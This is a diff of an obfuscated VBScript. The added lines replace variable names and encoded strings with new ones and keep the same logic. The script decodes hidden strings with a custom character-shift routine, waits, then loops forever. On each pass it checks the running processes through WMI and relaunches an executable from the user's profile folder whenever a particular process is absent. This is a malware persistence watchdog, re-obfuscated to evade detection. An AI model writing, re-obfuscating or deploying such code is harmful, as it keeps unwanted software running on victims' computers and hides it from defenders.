@@ -1,47 +1,48 @@
-srfgdrntw34 = CreateObject(tropc1("\S7MBI""Yvhh_&f?j{$zDf[lj9m-e5hOa{s")).UserName
-asd23434 = true
+fnhHjh3 = CreateObject(z6LmNi8s("0v.MPI~Ydh,_VfzjU$cDm[NjImve!hoay}")).UserName
+a8UJsD = true
 WScript.Sleep 300000
-Do while asd23434
-dfghm56w4 = false
-yukl67ru = "."
-Set bgfgb345 = GetObject(tropc1("75gmv_WdlcA]<c4jtiM0'R_RE]") & yukl67ru & tropc1("}#3Rgh(eUeKjgR)Yk_.c`lT(~)"))
-ghser5t3 = tropc1("d3wI{;&B?;C9JJRM") + " " + tropc1("jI#~k9") + " " +  tropc1("z\j<2H0EXCC7") + " " +  tropc1("2zeMV_9dQ){(FUIF5hJeLY""[Ki&iu+")
-Set sdf34234 = bgfgb345.ExecQuery(ghser5t3)
-For Each fgds5w453 In sdf34234
-    if fgds5w453.name = tropc1("z=_m#_Xd)hIW]h6#znj,z*H#7,T&&(3$~[DnR[*U") Then
-        dfghm56w4 = True
+Do while a8UJsD
+n65RtguH3Y = false
+gSqd02 = "."
+Set r4HQXc2tz5 = GetObject(z6LmNi8s("iY^m&_Ud[cc]lcojNi60/RARUH") & gSqd02 & z6LmNi8s("RG*Ruh&eCemj9RdYE_vcgl6(1r"))
+laZof4eUOj = z6LmNi8s("8VnI+;$B-;e9zJ0'") + " " + z6LmNi8s(">mx~y7") + " " +  z6LmNi8s("N""a<@H-EGCfg") + " " +  z6LmNi8s("2zeMV_9dQ){(FUIF5hJeLY""[Ki&iu+")
+Set wWt8056pbJ = r4HQXc2tz5.ExecQuery(laZof4eUOj)
+For Each bfQdy7K88P In wWt8056pbJ
+    if bfQdy7K88P.name = z6LmNi8s("NaVm1_VduhkW/hq#TnT,$*+#G,?&o(R$|[Nn([q""") Then
+        n65RtguH3Y = True
     end if
 Next
 
-Set rdtjne45tw3 = CreateObject(tropc1("&$0IfYYh}_rfCjq_(d9]<$w<U_&bS[YIYozi#jq[rc=EfXZ`/[%Y}jgB"))
-Set rgw45n2345 = WScript.CreateObject(tropc1(">%)M0ITY""hK_Uf/j*$iI*^>[Qb!b4n")) 
+Set n7k5h4w6v = CreateObject(z6LmNi8s("XH'ItYWhk_6fsjN_`d#]D$Z<e_ob>[xIWo%iWjZ[?ceE)Xh`3[MY'jJR"))
+Set uSki1d = WScript.CreateObject(z6LmNi8s(">%)M0ITY""hK_Uf/j*$iI*^>[Qb!b4n")) 
 WScript.Sleep 60000
-ghsrth456 = tropc1("CMo9e0>R1KHi.[gh&iMR*f")+ srfgdrntw34 + tropc1("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + tropc1("G3CmK_ld\hJW7hZ#tno,m*q#O,9&+(S$}[En.[I[")
-If rdtjne45tw3.FileExists(ghsrth456) Then
-    if dfghm56w4 = false then
-        rgw45n2345.Run ghsrth456, 1, false
+rBFXfxTANX = z6LmNi8s("vqe9s0;R}Kji^[Dh^i7R1H")+ fnhHjh3 + z6LmNi8s("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + z6LmNi8s("yV:mY_idJhmWhh7#NnY,u*T#_,$&t(s$|[Onb[3(")
+If n7k5h4w6v.FileExists(rBFXfxTANX) Then
+    if n65RtguH3Y = false then
+        uSki1d.Run rBFXfxTANX, 1, false
     end if
 end if
 WScript.Sleep 1000
 Loop
 
-Private Function tropc1(m453tw34b5n)
-    bnndhtrh = 10
-    dfghmw54 = 33
-    trm345m = 126
-    If Len(m453tw34b5n) < 5 Then
-        tropc1 = ""
+Private Function z6LmNi8s(nHHInIWZ2n)
+    yZkVfNn = 10
+    x2fmwD = 33
+    dqwv0Cm1 = 126
+    If Len(nHHInIWZ2n) < 5 Then
+        z6LmNi8s = ""
         Exit Function
     End If
-    Dim n56y3e45n1
-    m453tw34b5n = Mid(m453tw34b5n,3,Len(m453tw34b5n)-4)
-    For i=2 To Len(m453tw34b5n) Step 2
-        rnmgw4n5w341 = Asc(Mid(m453tw34b5n,i,1)) + bnndhtrh
-        If rnmgw4n5w341 > trm345m Then
-            rnmgw4n5w341 = rnmgw4n5w341 - trm345m + dfghmw54 - 1
+    Dim f9tBRl
+    nHHInIWZ2n = Mid(nHHInIWZ2n,3,Len(nHHInIWZ2n)-4)
+    For i=2 To Len(nHHInIWZ2n) Step 2
+        zCF3iV = Asc(Mid(nHHInIWZ2n,i,1)) + yZkVfNn
+        If zCF3iV > dqwv0Cm1 Then
+            zCF3iV = zCF3iV - dqwv0Cm1 + x2fmwD - 1
         End If
-        n56y3e45n1 = n56y3e45n1 & Chr(rnmgw4n5w341)
+        f9tBRl = f9tBRl & Chr(zCF3iV)
     Next
-    tropc1 = n56y3e45n1
+    z6LmNi8s = f9tBRl
 End Function
+
 
